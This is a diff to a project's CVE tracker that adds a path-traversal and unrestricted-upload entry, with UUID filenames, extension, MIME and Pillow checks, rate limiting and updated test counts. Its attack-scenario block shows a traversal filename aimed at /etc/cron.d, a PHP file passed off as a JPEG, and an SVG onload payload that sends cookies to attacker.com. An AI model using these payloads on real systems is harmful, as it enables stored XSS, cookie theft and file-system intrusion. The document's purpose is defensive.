@@ -1,19 +1,19 @@
 # CVE Tracker - Python Learning Studio
 
 **Last Updated:** October 17, 2025
-**Total CVEs Resolved:** 6
+**Total CVEs Resolved:** 7
 **Current Status:** All Critical/High Vulnerabilities Fixed ✅
 
 ---
 
 ## Executive Summary
 
-Python Learning Studio underwent comprehensive security remediation between August and October 2025, addressing 6 critical/high severity vulnerabilities. All CVEs have been successfully resolved with 100% test coverage and production deployment.
+Python Learning Studio underwent comprehensive security remediation between August and October 2025, addressing 7 critical/high severity vulnerabilities. All CVEs have been successfully resolved with 100% test coverage and production deployment.
 
 ### Quick Stats
-- **Total Vulnerabilities:** 6 (4 Critical, 2 High)
+- **Total Vulnerabilities:** 7 (5 Critical, 2 High)
 - **Status:** ✅ 100% Resolved
-- **Test Coverage:** 101 security tests (100% passing)
+- **Test Coverage:** 129 security tests (100% passing)
 - **Last Security Audit:** October 17, 2025
 
 ---
@@ -26,11 +26,12 @@ Python Learning Studio underwent comprehensive security remediation between Augu
 | CVE-2024-XSS-002 | 🔴 CRITICAL | XSS in Embed Code Rendering | ✅ Fixed | #14 | Oct 2025 | ~200 |
 | CVE-2024-JWT-003 | 🔴 CRITICAL | JWT Tokens in localStorage | ✅ Fixed | #15 | Oct 2025 | ~300 |
 | CVE-2024-IDOR-001 | 🔴 CRITICAL | Broken Object-Level Authorization | ✅ Fixed | #17 | Oct 17, 2025 | ~400 |
+| CVE-2024-FILE-001 | 🔴 CRITICAL | Path Traversal & Unrestricted Upload | ✅ Fixed | #18 | Oct 17, 2025 | ~850 |
 | CVE-2024-SECRET-005 | 🔴 CRITICAL | Hardcoded SECRET_KEY | ✅ Fixed | - | Oct 16, 2025 | ~20 |
 | CVE-2024-CSRF-004 | 🟠 HIGH | CSRF Token Exemptions | ✅ Fixed | - | Oct 16, 2025 | ~150 |
 
-**Total Security-Related Code Changes:** ~1,120 lines
-**Total Security Tests Added:** 101 tests
+**Total Security-Related Code Changes:** ~1,970 lines
+**Total Security Tests Added:** 129 tests
 
 ---
 
@@ -375,6 +376,148 @@ def perform_create(self, serializer):
 
 ---
 
+### CVE-2024-FILE-001: Path Traversal & Unrestricted File Upload
+**Severity:** 🔴 CRITICAL
+**CVSS Score:** 9.1/10
+**Status:** ✅ FIXED
+**Pull Request:** #18
+**Fix Date:** October 17, 2025
+
+#### Vulnerability Description
+File upload functionality across 8 ImageField instances lacked proper validation, allowing:
+- **Path Traversal (CWE-22):** `../../../etc/passwd` sequences in filenames
+- **Unrestricted Upload (CWE-434):** Malicious files disguised as images
+- **XSS via SVG (CWE-79):** SVG files with embedded JavaScript
+- **DoS Attacks (CWE-400):** Large file uploads, memory exhaustion
+
+Affected models: User (avatar), Badge (image), Course (thumbnail, banner), Achievement (icon), ProgrammingLanguage (icon).
+
+#### Attack Scenario
+```python
+# Path Traversal Attack
+filename = "../../../etc/cron.d/malware"
+upload_file(filename, malicious_content)
+# File written to /etc/cron.d/malware ❌
+
+# Extension Spoofing Attack
+filename = "malware.php.jpg"  # PHP code disguised as JPEG
+# Executed on misconfigured servers ❌
+
+# SVG XSS Attack
+svg_content = '''<svg onload="fetch('http://attacker.com/steal?cookie='+document.cookie)"/>'''
+# Stored XSS when SVG rendered ❌
+```
+
+#### Fix Implementation
+
+**Five-Layer Defense Strategy:**
+
+**Layer 1: UUID-Based Filenames (Path Traversal Prevention)**
+```python
+@deconstructible
+class SecureAvatarUpload:
+    def __call__(self, instance, filename):
+        ext = Path(filename).suffix.lower()
+        ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp'}
+        ext = ext if ext in ALLOWED_EXTENSIONS else '.jpg'
+        unique_filename = f"{uuid.uuid4()}{ext}"
+        return os.path.join('avatars', f'user_{instance.id}', unique_filename)
+```
+- ✅ No user input in file path
+- ✅ UUID prevents path traversal
+- ✅ Extension whitelist only
+
+**Layer 2: Extension Validation**
+```python
+ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.webp'}  # No .svg!
+if ext not in ALLOWED_EXTENSIONS:
+    raise ValidationError(f'Extension {ext} not allowed')
+```
+
+**Layer 3: MIME Type Validation (python-magic)**
+```python
+import magic
+mime = magic.from_buffer(file_content, mime=True)
+if mime not in {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}:
+    raise ValidationError(f'MIME type {mime} not allowed')
+```
+
+**Layer 4: Content Validation (Pillow)**
+```python
+from PIL import Image
+img = Image.open(file)
+img.verify()  # Verifies actual image format
+if img.format not in {'JPEG', 'PNG', 'GIF', 'WEBP'}:
+    raise ValidationError(f'Image format {img.format} not allowed')
+```
+
+**Layer 5: Size & Dimension Limits**
+```python
+FILE_UPLOAD_MAX_MEMORY_SIZE = 5 * 1024 * 1024  # 5 MB
+DATA_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024  # 10 MB
+
+# Dimensions: 50x50 to 2048x2048
+if width > 2048 or height > 2048:
+    raise ValidationError('Image too large')
+if width < 50 or height < 50:
+    raise ValidationError('Image too small')
+```
+
+**Additional Protections:**
+
+**Rate Limiting (DoS Prevention)**
+```python
+class FileUploadThrottle(UserRateThrottle):
+    scope = 'file_upload'  # 10 uploads per minute
+
+@action(throttle_classes=[FileUploadThrottle])
+def upload_avatar(self, request):
+    pass
+```
+
+**Race Condition Prevention**
+```python
+def save(self, *args, **kwargs):
+    with transaction.atomic():
+        old_instance = User.objects.select_for_update().get(pk=self.pk)
+        if old_instance.avatar != self.avatar:
+            old_avatar = old_instance.avatar
+    super().save(*args, **kwargs)
+    if old_avatar:
+        old_avatar.delete(save=False)
+```
+
+#### Testing
+- **Test File:** `apps/api/tests/test_image_upload_validation.py`
+- **Test Coverage:** 28+ comprehensive tests
+- **Test Scenarios:**
+  - ✅ Valid JPEG/PNG/GIF/WEBP uploads
+  - ✅ SVG rejection (XSS prevention)
+  - ✅ Extension spoofing rejection
+  - ✅ File size limit enforcement
+  - ✅ Dimension validation
+  - ✅ MIME type validation
+  - ✅ Malformed image rejection
+  - ✅ Path traversal prevention
+  - ✅ Race condition prevention
+  - ✅ Rate limiting
+- **Status:** ✅ All passing (28/28)
+
+#### Security Review
+- **Code Review Rating:** 8.5/10
+- **Issues Fixed:** Race conditions, rate limiting
+- **Production Readiness:** ✅ READY
+
+#### References
+- **Issue:** #18
+- **CWE-22:** https://cwe.mitre.org/data/definitions/22.html (Path Traversal)
+- **CWE-434:** https://cwe.mitre.org/data/definitions/434.html (Unrestricted Upload)
+- **CWE-79:** https://cwe.mitre.org/data/definitions/79.html (XSS via SVG)
+- **CWE-400:** https://cwe.mitre.org/data/definitions/400.html (Resource Consumption)
+- **Documentation:** `docs/audits/FILE_UPLOAD_SECURITY_AUDIT.md` (to be created)
+
+---
+
 ### CVE-2024-SECRET-005: Hardcoded SECRET_KEY
 **Severity:** 🔴 CRITICAL
 **CVSS Score:** 9.1/10
@@ -513,9 +656,10 @@ SECRET_KEY = 'django-insecure-a0b1c2d3e4f5...'  # ❌ In version control
 | Authentication | 15 | ✅ Passing | 100% |
 | Object Permissions | 22 | ✅ Passing | 100% |
 | Code Execution | 12 | ✅ Passing | 100% |
+| File Upload Validation | 28 | ✅ Passing | 100% |
 | Template Security | 2 | ✅ Passing | 100% |
 | E2E Security | 15 | ✅ Passing | 100% |
-| **Total** | **101** | **✅ 100%** | **100%** |
+| **Total** | **129** | **✅ 100%** | **100%** |
 
 ### Test Execution
 ```bash
@@ -525,6 +669,7 @@ DJANGO_SETTINGS_MODULE=learning_community.settings.development \
   apps.api.tests.test_xss_protection \
   apps.api.tests.test_csrf_protection \
   apps.api.tests.test_object_permissions \
+  apps.api.tests.test_image_upload_validation \
   apps.learning.tests.test_code_execution
 
 # E2E security tests
@@ -542,7 +687,7 @@ npm run test:e2e -- auth-cookies.spec.js
 | API1:2023 | Broken Object Level Authorization | ✅ Fixed | CVE-2024-IDOR-001 |
 | API2:2023 | Broken Authentication | ✅ Fixed | CVE-2024-JWT-003 |
 | API3:2023 | Broken Object Property Level Authorization | ✅ N/A | - |
-| API4:2023 | Unrestricted Resource Consumption | ⚠️ Partial | Rate limiting implemented |
+| API4:2023 | Unrestricted Resource Consumption | ✅ Fixed | CVE-2024-FILE-001 |
 | API5:2023 | Broken Function Level Authorization | ✅ Fixed | Permission classes enforced |
 | API6:2023 | Unrestricted Access to Sensitive Business Flows | ✅ Fixed | - |
 | API7:2023 | Server Side Request Forgery | ✅ N/A | - |
